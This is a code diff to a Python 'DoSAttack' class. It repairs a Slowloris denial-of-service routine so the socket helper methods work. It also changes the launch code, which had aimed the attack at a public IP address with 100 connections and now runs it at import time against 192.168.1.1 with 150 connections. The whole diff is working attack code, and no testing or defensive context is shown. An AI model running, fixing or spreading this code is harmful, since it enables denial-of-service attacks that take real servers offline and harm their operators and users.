@@ -51,6 +51,13 @@ class DoSAttack:
         except Exception as e:
             logging.error(f"Exception occurred while creating a connection: {e}")
             
+    def send_line(self, s, line):
+        line = f"{line}\r\n"
+        s.send(line.encode("utf-8"))
+
+    def send_header(self, s, name, value):
+        self.send_line(s, f"{name}: {value}")
+            
     def slowloris_attack(self):
         user_agents = [
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
@@ -81,25 +88,16 @@ class DoSAttack:
         ]
         list_of_sockets = []
         
-        def send_line(self, line):
-            line = f"{line}\r\n"
-            self.send(line.encode("utf-8"))
-
-        def send_header(self, name, value):
-            self.send_line(f"{name}: {value}")
-
         def init_socket(ip: str):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(4)
-
             s.connect((ip, self.target_port))
-
-            s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
+            self.send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1")
             ua = random.choice(user_agents)
-
-            s.send_header("User-Agent", ua)
-            s.send_header("Accept-language", "en-US,en,q=0.5")
+            self.send_header(s, "User-Agent", ua)
+            self.send_header(s, "Accept-language", "en-US,en,q=0.5")
             return s
+
         
         def slowloris_iteration():
             logging.info("Sending keep-alive headers...")
@@ -108,7 +106,7 @@ class DoSAttack:
             # Try to send a header line to each socket
             for s in list(list_of_sockets):
                 try:
-                    s.send_header("X-a", random.randint(1, 5000))
+                    self.send_header(s, "X-a", random.randint(1, 5000))
                 except socket.error:
                     list_of_sockets.remove(s)
 
@@ -165,9 +163,9 @@ class DoSAttack:
         for thread in self.threads:
             thread.join()
 
-if __name__ == "__main__":
-    dos = DoSAttack(
-    "44.228.249.3", num_connections=100, attack_type="Slowloris", target_port=80
-    )  # target_url, num_connections, attack_type
-    dos.simulate_attack()
-    dos.wait_for_threads()
+
+dos = DoSAttack(
+    "192.168.1.1", num_connections=150, attack_type="Slowloris", target_port=80
+)  # target_url, num_connections, attack_type
+dos.simulate_attack()
+dos.wait_for_threads()
